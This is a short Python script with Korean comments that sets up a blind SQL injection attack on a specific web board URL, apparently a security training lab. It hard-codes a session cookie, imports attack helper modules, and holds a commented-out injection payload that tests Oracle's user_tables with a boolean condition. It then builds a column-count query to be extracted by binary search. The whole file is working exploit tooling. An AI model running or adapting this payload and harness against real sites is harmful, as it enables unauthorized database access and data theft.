from attack_setting import attackData
from attack_query import attackQuerys
from binary_search import binary_search

#공격 대상 URL 및 초기 쿠키 설정 
url = "http://elms1.skinfosec.co.kr:8082/community6/free"
cookies = {
    "JSESSIONID":"3106532932C7C67EB0E80618CB7A5FE0"
}


attack_query = ''
page = attackData()
query = attackQuerys()
page.set_url(url)
page.set_cookies(cookies)

#쿼리 설정 및 요청 보내기(POST)
#page.send_post_request(request_string="%test' and (select count(TABLE_NAME) from user_tables)>0 and '1%'='1")

#기본 설정 보기 
#page.show
column_count_query = query.get_count_query('column')
#binary_search(page,column_count_query)
